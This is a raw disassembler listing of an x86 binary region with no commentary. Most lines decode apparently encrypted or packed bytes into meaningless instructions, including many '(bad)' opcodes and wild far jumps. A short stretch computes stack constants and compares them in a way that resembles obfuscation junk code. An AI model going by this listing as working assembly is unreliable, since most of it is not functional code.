  41d068:	xor    BYTE PTR [ecx-0x79],ch
  41d06b:	cs inc edi
  41d06d:	cmp    eax,edi
  41d06f:	push   0xecf41d4c
  41d074:	sti    
  41d075:	xchg   edx,eax
  41d076:	or     BYTE PTR [edi+0x19f87eb1],cl
  41d07c:	dec    esp
  41d07d:	sbb    al,0x4e
  41d07f:	pop    esp
  41d080:	(bad)  
  41d081:	xchg   edx,eax
  41d082:	push   0xffffffc1
  41d084:	dec    ebp
  41d085:	fcomp  st(4)
  41d087:	popa   
  41d088:	popa   
  41d089:	js     0x41d0fe
  41d08b:	push   es
  41d08c:	imul   esp,DWORD PTR [esi+eax*8],0x76
  41d090:	stc    
  41d091:	dec    ebx
  41d092:	push   ebp
  41d093:	sbb    dh,BYTE PTR [eax]
  41d095:	aaa    
  41d096:	pushf  
  41d097:	push   ss
  41d098:	mov    al,0x37
  41d09a:	leave  
  41d09b:	imul   ecx,DWORD PTR [esi+0x5a6371fe],0xd891e178
  41d0a5:	pop    ebx
  41d0a6:	retf   0xa123
  41d0a9:	mov    dh,0x83
  41d0ab:	repz dec ecx
  41d0ad:	inc    esp
  41d0ae:	(bad)  
  41d0af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0b0:	xor    al,0x1a
  41d0b2:	or     BYTE PTR [ebp+0x2d],dh
  41d0b5:	shr    DWORD PTR [edi],0xc0
  41d0b8:	jno    0x41d092
  41d0ba:	mov    ds:0xa7d44222,al
  41d0bf:	imul   edx,DWORD PTR [eax-0x44c23f03],0x683697e
  41d0c9:	mov    ds:0xb5c75bb7,eax
  41d0ce:	sub    al,cl
  41d0d0:	mov    cl,BYTE PTR [esp+0x38]
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x67bc6585
  41d15f:	sbb    al,0xe5
  41d161:	stos   BYTE PTR es:[edi],al
  41d162:	ss pop ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1+0x4b881818],bh
  41d16c:	aas    
  41d16d:	sub    DWORD PTR [eax],ecx
  41d16f:	(bad)  
  41d170:	mov    dl,0x6
  41d172:	jmp    0x41d163
  41d174:	and    BYTE PTR [ecx-0x2e6ffbc],ah
  41d17a:	out    dx,al
  41d17b:	mov    ds:0x11f02b1e,al
  41d180:	mov    dh,0x17
  41d182:	cmp    al,BYTE PTR [edx+0x54dccb23]
  41d188:	mov    esp,0x32084cf3
  41d18d:	loope  0x41d149
  41d18f:	scas   eax,DWORD PTR es:[edi]
  41d190:	cmc    
  41d191:	xchg   bl,ch
  41d193:	int    0xf0
  41d195:	imul   ebp,DWORD PTR [ecx-0x5937ccfd],0x7b
  41d19c:	push   0x33
  41d19e:	cmp    edx,DWORD PTR [edx+0x2]
  41d1a1:	dec    eax
  41d1a2:	sbb    eax,0xffffffc6
  41d1a5:	push   0xb6634531
  41d1aa:	inc    edx
  41d1ab:	pop    ss
  41d1ac:	adc    dh,BYTE PTR [esi+ecx*2+0x66e235c2]
  41d1b3:	xchg   esp,eax
  41d1b4:	jnp    0x41d214
  41d1b6:	sub    eax,ebx
  41d1b8:	out    dx,al
  41d1b9:	adc    dx,WORD PTR [edi]
  41d1bc:	jmp    0x8ffa119e
  41d1c1:	lahf   
  41d1c2:	repz mov ch,0xfb
  41d1c5:	xlat   BYTE PTR ds:[ebx]
  41d1c6:	int3   
  41d1c7:	or     edx,ebp
  41d1c9:	jl     0x41d233
  41d1cb:	or     eax,0x2e0f3c52
  41d1d0:	in     eax,dx
  41d1d1:	sar    DWORD PTR [edx],cl
  41d1d3:	xchg   edx,eax
  41d1d4:	dec    DWORD PTR [ebx+0x3a]
  41d1d7:	cdq    
  41d1d8:	mov    ?,WORD PTR [esp+eiz*2-0x76]
  41d1dc:	mov    edi,0x88c1180c
  41d1e1:	sbb    esi,ebp
  41d1e3:	sar    dh,1
  41d1e5:	lahf   
  41d1e6:	mov    esi,0xadaa9a02
  41d1eb:	and    edi,DWORD PTR [edi]
  41d1ed:	pop    edi
  41d1ee:	mov    edi,0xd8239a1f
  41d1f3:	es mov ebx,?
  41d1f6:	dec    ebx
  41d1f7:	nop
  41d1f8:	adc    DWORD PTR [eax+0x6b],edi
  41d1fb:	push   edi
  41d1fc:	push   edi
  41d1fd:	int    0x94
  41d1ff:	pop    eax
  41d200:	mov    ebp,es
  41d202:	inc    eax
  41d203:	aam    0xfe
  41d205:	push   0x9401874b
  41d20a:	(bad)  
  41d20b:	fcom   DWORD PTR [ebx+esi*1]
  41d20e:	in     eax,0xfb
  41d210:	popf   
  41d211:	mov    eax,ds:0x891ee79b
  41d216:	sbb    BYTE PTR [ecx],bl
  41d218:	popf   
  41d219:	hlt    
  41d21a:	aam    0xe1
  41d21c:	jl     0x41d215
  41d21e:	jmp    0x486b:0x44b09fa9
  41d225:	lds    ecx,FWORD PTR [eax]
  41d227:	push   ecx
  41d228:	pop    es
  41d229:	mov    WORD PTR [ecx+0x1a5bf06c],es
  41d22f:	retf   0x8817
  41d232:	dec    ecx
  41d233:	adc    edi,eax
  41d235:	or     edi,ecx
  41d237:	call   0x523d:0xc61ed80
  41d23e:	mov    ebp,0xc2d63306
  41d243:	inc    edi
  41d244:	aam    0xa4
  41d246:	out    dx,eax
  41d247:	fisttp QWORD PTR [edx-0x4e329c3f]
  41d24d:	dec    esp
  41d24e:	push   eax
  41d24f:	call   0x89ab574e
  41d254:	popf   
  41d255:	or     eax,0x90ba55d2
  41d25a:	stos   DWORD PTR es:[edi],eax
  41d25b:	sub    eax,0xdfe71543
  41d260:	rcr    BYTE PTR [esi],cl
  41d262:	ret    
  41d263:	and    DWORD PTR [edi+0x6ab1fa81],ebp
  41d269:	mov    cl,0x90
  41d26b:	aas    
  41d26c:	les    ecx,FWORD PTR [edi]
  41d26e:	mov    cl,0x7e
  41d270:	cmp    eax,0x31c6088d
  41d275:	xor    eax,0xb4545096
  41d27a:	(bad)  
  41d27c:	bound  ecx,QWORD PTR [edi-0x73852c0]
  41d282:	dec    ebp
  41d283:	int    0x43
  41d285:	pop    esp
  41d286:	sub    DWORD PTR [esi],ebx
  41d288:	push   ds
  41d289:	cmp    al,0x9b
  41d28b:	mov    al,0x89
  41d28d:	imul   DWORD PTR [esi]
  41d28f:	push   0x38
  41d291:	sbb    dl,BYTE PTR [eax+0x6849d2ad]
  41d297:	adc    edx,DWORD PTR [edx-0x53]
  41d29a:	dec    ebx
  41d29b:	repnz dec ebx
  41d29d:	push   0xffffffd8
  41d29f:	clc    
  41d2a0:	push   ecx
  41d2a1:	add    eax,0x56a2e4d1
  41d2a6:	jo     0x41d2e3
  41d2a8:	mov    edi,0xf0a1ddad
  41d2ad:	dec    ebx
  41d2ae:	jge    0x41d323
  41d2b0:	pop    edi
  41d2b1:	(bad)  
  41d2b2:	arpl   WORD PTR [edx+edi*8+0x1f],ax
  41d2b6:	mov    cl,BYTE PTR [ecx+edi*4]
  41d2b9:	sbb    al,0x24
  41d2bb:	inc    ecx
  41d2bc:	addr16 pop edx
  41d2be:	xor    al,0x9
  41d2c0:	mov    al,ds:0x40d3a31e
  41d2c5:	sub    BYTE PTR [eax+0x55],bl
  41d2c8:	push   cs
  41d2c9:	stos   DWORD PTR es:[edi],eax
  41d2ca:	(bad)  
  41d2cb:	cmp    BYTE PTR [esi],ch
  41d2cd:	div    DWORD PTR [edx]
  41d2cf:	cwde   
  41d2d0:	sub    cl,BYTE PTR [edi-0x19]
  41d2d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2d4:	sti    
  41d2d5:	pusha  
  41d2d6:	repz test BYTE PTR [ebx+0x22ba0d5d],dl
  41d2dd:	jns    0x41d2e6
  41d2df:	mov    al,0x35
  41d2e1:	sbb    dl,BYTE PTR [edi]
  41d2e3:	push   esi
  41d2e4:	add    BYTE PTR [edi],dl
  41d2e6:	stos   BYTE PTR es:[edi],al
  41d2e7:	jge    0x41d273
  41d2e9:	mov    WORD PTR fs:[ecx+0x52],ss
  41d2ed:	sub    dh,BYTE PTR ds:0x412b5d21
  41d2f3:	int    0xe
  41d2f5:	or     DWORD PTR ss:0xc1ef34ce,eax
  41d2fc:	les    eax,FWORD PTR [ebx+0x69]
  41d2ff:	push   0x63e3d3a4
  41d304:	aaa    
  41d305:	and    eax,0xe91afdd2
  41d30a:	call   FWORD PTR [esi-0x42]
  41d30d:	cld    
  41d30e:	xchg   ebx,eax
  41d30f:	inc    eax
  41d310:	mov    edx,0xffb77ea1
  41d315:	fcomp  DWORD PTR [edi+0xdbfc172]
  41d31b:	test   dl,ch
  41d31d:	in     eax,dx
  41d31e:	(bad)  
  41d31f:	xchg   esi,eax
  41d320:	hlt    
  41d321:	fcomi  st,st(0)
  41d323:	(bad)  
  41d324:	or     DWORD PTR [edx-0x40],ebp
  41d327:	ror    BYTE PTR [esi-0x6c],0x85
  41d32b:	add    al,0x8a
  41d32d:	pop    es
  41d32e:	int    0x1e
  41d330:	idiv   bl
  41d332:	ds mov ebx,0xc80c0b16
  41d338:	sbb    ebx,DWORD PTR [esi-0x79e8b8ef]
  41d33e:	and    eax,0x5d5437f1
  41d343:	stos   BYTE PTR es:[edi],al
  41d344:	mov    bl,0x25
  41d346:	jle    0x41d322
  41d348:	pop    edi
  41d349:	imul   esi,ebx,0x468b4776
  41d34f:	in     eax,0x8d
  41d351:	cwde   
  41d352:	jg     0x41d369
  41d354:	fadd   QWORD PTR [esi-0x48]
  41d357:	dec    edx
  41d358:	test   al,0xeb
  41d35a:	xchg   ecx,eax
  41d35b:	stc    
  41d35c:	inc    edx
  41d35d:	dec    edi
  41d35e:	in     al,0x7b
  41d360:	fs xchg esp,eax
  41d362:	jecxz  0x41d3c3
  41d364:	mov    WORD PTR [edx+0x4e0871b5],gs
  41d36a:	aas    
  41d36b:	mov    ds:0xa9563e88,eax
  41d370:	popa   
  41d371:	in     eax,0xd5
  41d373:	popf   
  41d374:	xchg   esi,eax
  41d375:	(bad)  
  41d376:	rcr    DWORD PTR [ebx+0x1473a5a5],0xa6
  41d37d:	jne    0x41d3d5
  41d37f:	xchg   ebp,eax
  41d380:	push   eax
  41d381:	and    eax,0x6485ee6f
  41d386:	adc    cl,BYTE PTR ds:0x332ce04b
  41d38c:	leave  
  41d38d:	inc    esp
  41d38e:	sub    esp,ecx
  41d390:	pop    ss
  41d391:	lahf   
  41d392:	loop   0x41d3ec
  41d394:	jae    0x41d39f
  41d396:	jnp    0x41d3d7
  41d398:	pop    ds
  41d399:	push   esi
  41d39a:	test   BYTE PTR [ecx+0x37],ah
  41d39d:	adc    dh,cl
  41d39f:	adc    eax,0xbcabb57e
  41d3a4:	enter  0xfc2e,0xc9
  41d3a8:	ja     0x41d40c
  41d3aa:	xchg   ecx,eax
  41d3ab:	inc    esi
  41d3ac:	ins    BYTE PTR es:[edi],dx
  41d3ad:	adc    eax,0xd2a7417d
  41d3b2:	inc    eax
  41d3b3:	dec    ecx
  41d3b4:	mov    ch,0xa8
  41d3b6:	jno    0x41d404
  41d3b8:	out    dx,al
  41d3b9:	not    ah
  41d3bb:	or     BYTE PTR [ecx+eax*1-0x73],bh
  41d3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3c0:	sub    DWORD PTR [esi+0x51],eax
  41d3c3:	(bad)  
  41d3c4:	lds    ecx,FWORD PTR [edi+0x6080c581]
  41d3ca:	or     BYTE PTR [edx-0xf],0xb0
  41d3ce:	mov    edx,0x2f325035
  41d3d3:	fld    TBYTE PTR [eax-0x39]
  41d3d6:	ja     0x41d3c2
  41d3d8:	aas    
  41d3d9:	aam    0xff
  41d3db:	rcr    DWORD PTR [ecx],cl
  41d3dd:	sbb    al,0xe1
  41d3df:	loop   0x41d3bf
  41d3e1:	jbe    0x41d372
  41d3e3:	stos   DWORD PTR es:[edi],eax
  41d3e4:	adc    bl,BYTE PTR [edx-0x15]
  41d3e7:	out    dx,al
  41d3e8:	arpl   WORD PTR [ebx],bp
  41d3ea:	std    
  41d3eb:	inc    edx
  41d3ec:	out    0x1b,eax
  41d3ee:	mov    DWORD PTR [esi],edx
  41d3f0:	inc    esp
  41d3f1:	cmp    BYTE PTR [edi+0x4e6f1e62],ch
  41d3f7:	sahf   
  41d3f8:	stos   BYTE PTR es:[edi],al
  41d3f9:	jnp    0x41d383
  41d3fb:	pop    esp
  41d3fc:	or     al,0x8
  41d3fe:	sub    dl,BYTE PTR [esi+0x14e9eed8]
  41d404:	rol    DWORD PTR [eax+ecx*8-0x3b],1
  41d408:	or     ebp,DWORD PTR [edx-0x30]
  41d40b:	sub    al,0x3c
  41d40d:	jl     0x41d45e
  41d40f:	mov    ebx,0xe9daef27
  41d414:	shr    esp,cl
  41d416:	ficom  WORD PTR [edx]
  41d418:	xor    eax,0x80dce263
  41d41d:	push   ds
  41d41e:	or     eax,0x2933868a
  41d423:	push   0x2096abb4
  41d428:	aas    
  41d429:	mov    ch,0x43
  41d42b:	pop    ds
  41d42c:	and    BYTE PTR [esi+0x3f],dl
  41d42f:	fldenv [ebp+0x6d]
  41d432:	sbb    al,0x65
  41d434:	push   eax
  41d435:	pop    ebx
  41d436:	shr    BYTE PTR [eax-0x4c],1
  41d439:	int3   
  41d43a:	mov    ds:0xae42e0c2,eax
  41d43f:	push   esp
  41d440:	push   ds
  41d441:	ss loopne 0x41d4ad
  41d444:	mov    edi,0x3e9d7e92
  41d449:	test   bh,0x31
  41d44c:	and    eax,0x517d3ac8
  41d451:	sbb    BYTE PTR [esp+ebx*4+0x6c],ch
  41d455:	ret    0xfc79
  41d458:	mov    al,0x6e
  41d45a:	add    BYTE PTR [esi+0x4542aaf4],ah
  41d460:	mov    dl,BYTE PTR [ecx+0x57]
  41d463:	dec    ecx
  41d464:	stos   DWORD PTR es:[edi],eax
  41d465:	jle    0x41d3f1
  41d467:	fcmovnu st,st(1)
  41d469:	push   ds
  41d46a:	mov    ebp,0xc6c2f5fe
  41d46f:	call   DWORD PTR ds:0xd5069b56
  41d475:	jmp    0x5497:0xe0735cf0
  41d47c:	aam    0x93
  41d47e:	mov    al,ds:0x95be8e6a
  41d483:	jecxz  0x41d446
  41d485:	jmp    0xc5d6e693
  41d48a:	sti    
  41d48b:	inc    ebx
  41d48c:	sub    cl,BYTE PTR [ebx-0x58749ce7]
  41d492:	and    BYTE PTR [esp+eax*1],0x16
  41d496:	retf   
  41d497:	pop    ss
  41d498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d499:	fcomp  DWORD PTR [ebx-0x743904cb]
  41d49f:	out    0x8e,eax
  41d4a1:	inc    ecx
  41d4a2:	retf   0xefeb
  41d4a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4a6:	test   al,0xc
  41d4a8:	fwait
  41d4a9:	dec    esp
  41d4aa:	adc    eax,DWORD PTR [edi-0x5d963c50]
  41d4b0:	mov    BYTE PTR [ebx],0xad
  41d4b3:	loopne 0x41d4ca
  41d4b5:	jo     0x41d4b8
  41d4b7:	inc    eax
  41d4b8:	xchg   ecx,eax
  41d4ba:	jge    0x41d481
  41d4bc:	addr16 push esi
  41d4be:	bound  ecx,QWORD PTR [esp+edi*8-0x37]
  41d4c2:	mov    ecx,0xeec56aea
  41d4c7:	xchg   ecx,eax
  41d4c8:	clc    
  41d4c9:	push   eax
  41d4ca:	sbb    al,0x76
  41d4cc:	push   edx
  41d4cd:	sbb    esi,DWORD PTR [eax+eiz*2+0x2]
  41d4d1:	xchg   DWORD PTR [esi],edi
  41d4d3:	and    eax,0x4a4c9dcc
  41d4d8:	mov    ah,0xf0
  41d4da:	js     0x41d476
  41d4dc:	pop    eax
  41d4dd:	xchg   ebx,eax
  41d4de:	pushf  
  41d4df:	mov    al,0x80
  41d4e1:	out    dx,al
  41d4e2:	addr16 stc 
  41d4e4:	push   0x7
  41d4e6:	(bad)  
  41d4e7:	push   ds
  41d4e8:	fcom   DWORD PTR [ebx-0x7d3f80cc]
  41d4ee:	sbb    dl,BYTE PTR [edx]
  41d4f0:	push   0x53
  41d4f2:	das    
  41d4f3:	fld    QWORD PTR [eax]
  41d4f5:	(bad)  
  41d4f7:	push   eax
  41d4f8:	mov    ebp,0x1756a6b9
  41d4fd:	inc    ebp
  41d4fe:	jne    0x41d487
  41d500:	and    edi,DWORD PTR [edx-0x21d7ab0e]
  41d506:	pop    ebx
  41d507:	iret   
  41d508:	jge    0x41d4e2
  41d50a:	pop    ecx
  41d50b:	mov    bh,ch
  41d50d:	rcl    DWORD PTR [eax],1
  41d50f:	jg     0x41d4d1
  41d511:	mov    ds:0x8da18013,eax
  41d516:	sahf   
  41d517:	jmp    0x6a0878b8
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d5b2
  41d54b:	mov    esi,DWORD PTR [edi]
  41d54d:	push   0xffffffda
  41d54f:	push   ebp
  41d550:	push   ss
  41d551:	sbb    BYTE PTR [edx+edx*1+0x13861818],bh
  41d558:	xchg   edx,eax
  41d559:	es int 0x87
  41d55c:	xchg   esi,eax
  41d55d:	xor    al,0x93
  41d55f:	arpl   WORD PTR [edi+0x76],bp
  41d562:	imul   edi,ebp,0x9adcc74c
  41d568:	enter  0x9833,0xc5
  41d56c:	xchg   edi,eax
  41d56d:	dec    ebx
  41d56e:	pop    edx
  41d56f:	inc    eax
  41d570:	(bad)  
  41d571:	dec    esp
  41d572:	dec    eax
  41d573:	jb     0x41d5f3
  41d575:	xor    BYTE PTR [ebx+0x3e],cl
  41d578:	xor    edi,DWORD PTR [edx+0x17053337]
  41d57e:	call   0xd67b1733
  41d583:	cmp    al,0x6b
  41d585:	mov    cl,0x9a
  41d587:	jae    0x41d50f
  41d589:	imul   edx,DWORD PTR [esi-0x64f739ab],0xd904d152
  41d593:	or     edx,DWORD PTR [edx+0x8]
  41d596:	lock int 0x75
  41d599:	out    dx,eax
  41d59a:	jb     0x41d5fb
  41d59c:	mov    ?,WORD PTR [ebx]
  41d59e:	gs add cl,ch
  41d5a1:	xor    eax,0xc684a66e
  41d5a6:	pusha  
  41d5a7:	cld    
  41d5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a9:	aaa    
  41d5aa:	shl    DWORD PTR [esi+0x5561d240],cl
  41d5b0:	inc    BYTE PTR [eax+0x74]
  41d5b3:	cld    
  41d5b4:	adc    DWORD PTR ds:0xb192688,eax
  41d5ba:	inc    ebx
  41d5bb:	dec    ecx
  41d5bc:	or     al,0x34
  41d5bf:	dec    ebx
  41d5c0:	cld    
  41d5c1:	mov    ebp,0xbd74649c
  41d5c6:	inc    ebx
  41d5c7:	in     eax,dx
  41d5c8:	push   0x6eb1b9e4
  41d5cd:	xchg   edi,eax
  41d5ce:	adc    DWORD PTR [edx+edx*2],ecx
  41d5d1:	(bad)  
  41d5d2:	cmp    DWORD PTR [ecx-0x39d9fa64],0xffffff8b
  41d5d9:	shl    DWORD PTR [edx-0x3a],0xcf
  41d5dd:	test   al,cl
  41d5df:	scas   al,BYTE PTR es:[edi]
  41d5e0:	pop    esp
  41d5e1:	push   es
  41d5e2:	lods   al,BYTE PTR ds:[esi]
  41d5e3:	icebp  
  41d5e4:	push   cs
  41d5e5:	aaa    
  41d5e6:	in     eax,dx
  41d5e7:	or     al,0x51
  41d5e9:	mov    ?,WORD PTR [edx+0x679da57]
  41d5ef:	mov    ds:0x6011c8d0,eax
  41d5f4:	xor    bl,BYTE PTR [edx-0x18]
  41d5f7:	popa   
  41d5f8:	add    DWORD PTR [eax+0x5f],edi
  41d5fb:	rcr    DWORD PTR [ebp-0x29],0xc5
  41d5ff:	stos   DWORD PTR es:[edi],eax
  41d600:	push   ecx
  41d601:	into   
  41d602:	xchg   ecx,eax
  41d603:	or     edi,0x1faeb45e
  41d609:	lds    ecx,FWORD PTR [bx+di-0x816]
  41d60e:	mov    esi,0x10a514c8
  41d613:	repz ss or esi,ebp
  41d617:	enter  0x67be,0x1c
  41d61b:	lods   al,BYTE PTR ds:[esi]
  41d61c:	(bad)  
  41d61d:	sti    
  41d61e:	add    eax,0xf5b5d662
  41d623:	dec    esp
  41d624:	add    DWORD PTR [esi+0xf7d7ca],edi
  41d62a:	inc    edx
  41d62b:	cwde   
  41d62c:	cli    
  41d62d:	pop    ebx
  41d62e:	push   ebp
  41d62f:	int    0xa7
  41d631:	sbb    eax,0xbc94a0e1
  41d636:	and    BYTE PTR [eax],bl
  41d638:	pop    ebx
  41d639:	pop    ss
  41d63a:	jns    0x41d652
  41d63c:	jge    0x41d616
  41d63e:	in     eax,dx
  41d63f:	aas    
  41d640:	adc    cl,BYTE PTR [esi+0x67]
  41d643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d644:	mov    dl,0x79
  41d646:	cmc    
  41d647:	fidiv  DWORD PTR [edi+0x4b]
  41d64a:	xlat   BYTE PTR ds:[ebx]
  41d64b:	adc    cl,dh
  41d64d:	or     bh,BYTE PTR [ecx]
  41d64f:	or     dl,BYTE PTR [edi-0x68a529c6]
  41d655:	gs (bad) 
  41d657:	push   esp
  41d658:	mov    edx,0xb79fe700
  41d65d:	out    0xd7,eax
  41d65f:	dec    DWORD PTR [edi+0x41]
  41d662:	aaa    
  41d663:	jmp    0x41d638
  41d665:	pop    ss
  41d666:	cmp    bh,ch
  41d668:	jecxz  0x41d658
  41d66a:	in     eax,dx
  41d66b:	adc    al,0xe2
  41d66d:	les    ebx,FWORD PTR [edi+edi*2]
  41d670:	jecxz  0x41d6ea
  41d672:	add    DWORD PTR [eax-0x402ca2a1],ebp
  41d678:	jne    0x41d69d
  41d67a:	mov    ds:0x8f8b5221,al
  41d67f:	xchg   DWORD PTR [esi-0x117025b0],eax
  41d685:	adc    BYTE PTR [ecx],ch
  41d687:	inc    BYTE PTR [ebx-0x75]
  41d68a:	adc    eax,DWORD PTR fs:[ecx+0x53]
  41d68e:	xchg   DWORD PTR [edi-0x4c],ebp
  41d691:	push   es
  41d692:	jne    0x41d6d2
  41d694:	test   DWORD PTR [edi-0x1c677e4a],0xeef2c43c
  41d69e:	jbe    0x41d64a
  41d6a0:	mov    ebx,0x23473977
  41d6a5:	das    
  41d6a6:	mov    ebx,0x65e5e7ce
  41d6ab:	fisubr DWORD PTR [ecx-0x533dc962]
  41d6b1:	sub    DWORD PTR ds:0xd98eacae,ebp
  41d6b7:	fild   QWORD PTR [edi]
  41d6b9:	push   edx
  41d6ba:	sub    al,0xca
  41d6bc:	clc    
  41d6bd:	xlat   BYTE PTR ds:[ebx]
  41d6be:	jg     0x41d656
  41d6c0:	mul    edi
  41d6c2:	outs   dx,BYTE PTR ds:[esi]
  41d6c3:	xor    ebp,edi
  41d6c5:	fs stos BYTE PTR es:[edi],al
  41d6c7:	dec    ecx
  41d6c8:	xchg   esi,eax
  41d6c9:	mov    al,ds:0x24da7fa5
  41d6ce:	test   eax,0xc727a4fc
  41d6d3:	cmp    ch,BYTE PTR ds:0x9d44d288
  41d6d9:	retf   0xa9f0
  41d6dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6dd:	mov    cl,0xc8
  41d6df:	outs   dx,DWORD PTR ds:[esi]
  41d6e0:	push   ss
  41d6e1:	dec    ebx
  41d6e2:	fiadd  WORD PTR [ecx+0x12]
  41d6e5:	mov    esp,0xa6f3c2ea
  41d6ea:	out    0x83,al
  41d6ec:	xchg   ebx,eax
  41d6ed:	(bad)  
  41d6ee:	jl     0x41d6ed
  41d6f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6f1:	pusha  
  41d6f2:	xchg   edi,eax
  41d6f3:	hlt    
  41d6f4:	int3   
  41d6f5:	add    DWORD PTR [ebp-0x2c],0xe8ade786
  41d6fc:	idiv   BYTE PTR [ecx-0x547b1f4e]
  41d702:	push   esp
  41d703:	inc    ebp
  41d704:	sub    al,0xf1
  41d706:	jo     0x41d6a7
  41d708:	push   edx
  41d709:	jmp    0xdded11f0
  41d70e:	pop    ecx
  41d70f:	lds    ebx,FWORD PTR [ecx]
  41d711:	mov    edx,0xbc6a79da
  41d716:	fwait
  41d717:	ret    0xc563
  41d71a:	cld    
  41d71b:	cld    
  41d71c:	or     ecx,DWORD PTR [edx-0x14221e5]
  41d722:	loope  0x41d718
  41d724:	fsub   QWORD PTR [edx-0x1c]
  41d727:	or     al,0xdc
  41d729:	or     al,0x8b
  41d72b:	mov    al,bl
  41d72d:	in     al,dx
  41d72e:	push   ds
  41d72f:	mov    WORD PTR ds:[edi],cs
  41d732:	ret    
  41d733:	adc    esi,esi
  41d735:	sub    DWORD PTR [eax-0x15],ecx
  41d738:	jle    0x41d712
  41d73a:	js     0x41d72b
  41d73c:	adc    DWORD PTR [ecx-0x70],ebx
  41d73f:	dec    eax
  41d741:	jmp    0x41d797
  41d743:	jno    0x41d76f
  41d745:	imul   eax,DWORD PTR [edx],0x64
  41d748:	jle    0x41d744
  41d74a:	push   esp
  41d74b:	sbb    BYTE PTR [edx+0x4e619bbf],0x55
  41d752:	fwait
  41d753:	inc    ebx
  41d754:	fadd   st,st(4)
  41d756:	cmc    
  41d757:	cmc    
  41d758:	xchg   ebp,eax
  41d759:	sbb    BYTE PTR [edi+0x7492b3f],al
  41d75f:	test   BYTE PTR [ebx+0x335bcf66],ch
  41d765:	cmp    esp,DWORD PTR [eax+ebp*8]
  41d768:	imul   edx,DWORD PTR [edi+0x4e],0x1b
  41d76c:	cld    
  41d76d:	jge    0x41d75d
  41d76f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d770:	addr16 adc al,0x99
  41d773:	stc    
  41d774:	popa   
  41d775:	dec    eax
  41d776:	push   0x49
  41d778:	retf   
  41d779:	imul   ecx,edx,0x1b
  41d77c:	cmc    
  41d77d:	xor    esi,DWORD PTR [ebp+0x2c37be65]
  41d783:	mov    esp,0x8f2d5968
  41d788:	loop   0x41d7de
  41d78a:	sub    esi,esi
  41d78c:	mov    DWORD PTR [eax-0x4d],edi
  41d78f:	push   ebx
  41d790:	pusha  
  41d791:	out    dx,eax
  41d792:	pop    ecx
  41d793:	cmp    BYTE PTR [edi+0x10],0xf3
  41d797:	imul   edx,DWORD PTR [esi-0x52360faf],0xd595c5f
  41d7a1:	xchg   edi,eax
  41d7a2:	scas   eax,DWORD PTR es:[edi]
  41d7a3:	lock adc bl,BYTE PTR [ebx]
  41d7a6:	cmp    BYTE PTR [eax],bl
  41d7a8:	pop    ebx
  41d7a9:	adc    dh,BYTE PTR ds:0xdabfa102
  41d7af:	add    DWORD PTR [ebx+0x7de657c4],ebx
  41d7b5:	int3   
  41d7b6:	sub    edx,DWORD PTR [edx]
  41d7b8:	jmp    0xcca:0xbb7b3c4
  41d7bf:	fld    DWORD PTR ds:0xc0076e6e
  41d7c5:	jp     0x41d83f
  41d7c7:	push   cs
  41d7c8:	mov    cl,0xab
  41d7ca:	cli    
  41d7cb:	mov    ds,WORD PTR [ebx]
  41d7cd:	cmp    DWORD PTR [edx],edx
  41d7cf:	and    ah,BYTE PTR ds:0x3d2b6c4c
  41d7d5:	or     eax,0x75f8bcf5
  41d7da:	cmp    eax,0x26b8d6de
  41d7df:	lea    ebp,[edx-0x7b]
  41d7e2:	imul   esp,DWORD PTR [edx+esi*2+0x4a37a744],0x3d
  41d7ea:	(bad)  
  41d7eb:	fadd   QWORD PTR [ebx+ebx*2+0x7796b9b5]
  41d7f2:	pop    eax
  41d7f3:	loope  0x41d871
  41d7f5:	into   
  41d7f6:	adc    DWORD PTR [eax+0x6d477e9],eax
  41d7fc:	pop    ebp
  41d7fd:	stc    
  41d7fe:	xchg   edi,eax
